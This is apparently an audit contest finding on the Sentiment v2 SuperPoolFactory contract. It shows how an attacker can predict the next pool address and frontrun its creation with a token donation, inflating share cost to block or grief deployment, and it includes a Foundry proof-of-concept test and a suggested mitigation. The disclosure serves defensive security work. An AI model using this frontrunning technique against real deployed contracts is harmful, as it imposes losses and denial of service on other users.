Orbiting Bronze Mustang

High

# Griefer can DOS the `SuperPool` creation and make it very expensive for other users

### Summary

The `SuperPoolFactory.sol` contract creates new `SuperPool` instances using the `new` keyword, which is essentially using the `CREATE` opcode. This means that the address of the next `SuperPool` instance can be known by any user. To create a new `SuperPool`, it's essential to deposit and burn a minimum of 1000 shares. A griefer can frontrun `SuperPool` creation transactions and `transfer` small amounts of tokens to the known `SuperPool` address to make shares expensive and prevent the creation of the `SuperPool`.

### Root Cause

1. When using the `CREATE` opcode, the new contract address depends on the deployer address (the `SuperPoolFactory.sol` address which is known) and its nonce (which can be calculated by simply looking at `SuperPoolFactory`'s etherscan). Even [ethers](https://docs.ethers.org/v5/api/utils/address/#utils-getContractAddress) has a function to calculate the next address. This means that the next `SuperPool` address that will be created is known and can't be changed.

2. `SuperPool` creation requires the user to deposit and burn a minimum of `1000 shares`, otherwise the transaction will revert.

[deploySuperPool](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/SuperPoolFactory.sol#L56):

```solidity
    function deploySuperPool(
        address owner,
        address asset,
        address feeRecipient,
        uint256 fee,
        uint256 superPoolCap,
        uint256 initialDepositAmt,
        string calldata name,
        string calldata symbol
    ) external returns (address) {
        if (fee != 0 && feeRecipient == address(0)) revert SuperPoolFactory_ZeroFeeRecipient();
@>      SuperPool superPool = new SuperPool(POOL, asset, feeRecipient, fee, superPoolCap, name, symbol);
        superPool.transferOwnership(owner);
        isDeployerFor[address(superPool)] = true;

        // burn initial deposit
        IERC20(asset).safeTransferFrom(msg.sender, address(this), initialDepositAmt); // assume approval
        IERC20(asset).approve(address(superPool), initialDepositAmt);
@>      uint256 shares = superPool.deposit(initialDepositAmt, address(this));
@>      if (shares < MIN_BURNED_SHARES) revert SuperPoolFactory_TooFewInitialShares(shares);
        IERC20(superPool).transfer(DEAD_ADDRESS, shares);

        emit SuperPoolDeployed(owner, address(superPool), asset, name, symbol);
        return address(superPool);
    }
```

Note that `uint256 public constant MIN_BURNED_SHARES = 1000;`

An attacker can frontrun this transaction from a regular user and donate to the already known `address` a small amount of the `SuperPool`'s selected asset to inflate the shares and make them very expensive for the user to create the `SuperPool` (exact numbers shown in the coded PoC).

The shares inflation happens because of the [`_convertToShares`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/SuperPool.sol#L456) function used in the [`deposit`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/SuperPool.sol#L258) function:

```solidity
    function deposit(uint256 assets, address receiver) public nonReentrant returns (uint256 shares) {
        accrue();
@>      shares = _convertToShares(assets, lastTotalAssets, totalSupply(), Math.Rounding.Down);
        if (shares == 0) revert SuperPool_ZeroShareDeposit(address(this), assets);
        _deposit(receiver, assets, shares);
    }
```
```solidity
    function _convertToShares(
        uint256 _assets,
        uint256 _totalAssets,
        uint256 _totalShares,
        Math.Rounding _rounding
    ) public view virtual returns (uint256 shares) {
        shares = _assets.mulDiv(_totalShares + 1, _totalAssets + 1, _rounding);
    }
```

Normally a user would only need `1000 assets` to mint `1000 shares` (1000 * 1 / 1 = 1000 shares using the `_convertToShares` formula above). Imagine a donation of `1000000 assets` before the transaction. Now `1000 assets` would give `0 shares` (1000 * 1 / 1000001 = 0 shares). With a token like `USDC` which has 6 decimals and is in scope, a user would need $1000 to overcome a $1 donation and mint `1000 shares`.



### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

1. Attacker calculates the address of the next `SuperPool`.
2. User sends a transaction to create a `SuperPool`.
3. Attacker frontruns this transaction and donates a small amount of the user's specified `SuperPool` asset.
4. User's transaction fails due to not enough dead shares minted.
5. It is now very expensive to create that specific `SuperPool`.

### Impact

It will become very expensive to create a `SuperPool`, many users won't want to do it and `SuperPools` will stop getting created.

### PoC

Paste the following code in the `test/core/Superpool.t.sol` test file and follow the comments:

```solidity
    function testSuperPoolDOS() public {
        // Let's say that the asset is USDC which has 6 decimals and assume 1 USDC = $1
        asset1.mint(user, 10 ether);
        asset1.mint(user2, 10 ether);

        // User has calculated the address of the next SuperPool and donates 1 USDC before the creation transaction
        vm.prank(user);
        asset1.transfer(0x1cEE5337E266BACD38c2a364b6a65D8fD1476f14, 1_000_000);

        vm.prank(user2);
        asset1.approve(address(superPoolFactory), 10 ether);

        // Error selectors to be used with the vm.expectReverts
        bytes4 selectorFactory = bytes4(keccak256("SuperPoolFactory_TooFewInitialShares(uint256)"));
        bytes4 selectorSuperPool = bytes4(keccak256("SuperPool_ZeroShareDeposit(address,uint256)"));

        // Deposit amounts
        uint256 normalMinAmount = 1000;
        uint256 oneThousandUSDC = 1_000_000_000;

        // user2 tries to create a SuperPool sending the supposed min amount of 1000, it reverts because he minted 0
        // shares
        vm.prank(user2);
        vm.expectRevert(abi.encodeWithSelector(selectorSuperPool, 0x1cEE5337E266BACD38c2a364b6a65D8fD1476f14, 1000));
        superPoolFactory.deploySuperPool(
            user2, address(asset1), user2, 0.01 ether, type(uint256).max, normalMinAmount, "test", "test"
        );

        // user2 tries to create a SuperPool sending 1000 USDC, it reverts because he minted 999 shares
        vm.prank(user2);
        vm.expectRevert(abi.encodeWithSelector(selectorFactory, 999));
        superPoolFactory.deploySuperPool(
            user2, address(asset1), user2, 0.01 ether, type(uint256).max, oneThousandUSDC, "test", "test"
        );

        // Here is a test to prove that SuperPool creation is NOT dependant on block.timestamp, block.number, address
        // calling the transaction or function parameters
        // All of these are changed and the transaction fails with the same error message because it still creates the
        // SuperPool at the same address as befores
        vm.prank(user);
        asset1.approve(address(superPoolFactory), 10 ether);
        vm.warp(block.timestamp + 45_914_891);
        vm.roll(block.number + 100);

        vm.prank(user);
        vm.expectRevert(abi.encodeWithSelector(selectorFactory, 999));
        superPoolFactory.deploySuperPool(
            user, address(asset1), user, 0.01 ether, type(uint256).max, oneThousandUSDC, "test1", "test1"
        );

        // user2 sends the transaction with 1001 USDC, it is now succesful since it minted the required 1000 shares
        vm.prank(user2);
        superPoolFactory.deploySuperPool(
            user2, address(asset1), user2, 0.01 ether, type(uint256).max, 1_001_000_000, "test", "test"
        );
    }
```

### Mitigation

Don't require from the user to deposit and actually mint the dead shares. You can hardcode them in the `SuperPool` contract by making for e.g.:

1. The `totalAssets` function to return the actual total assets + 1000
2. The `totalSupply` function to return the actual total supply + 1000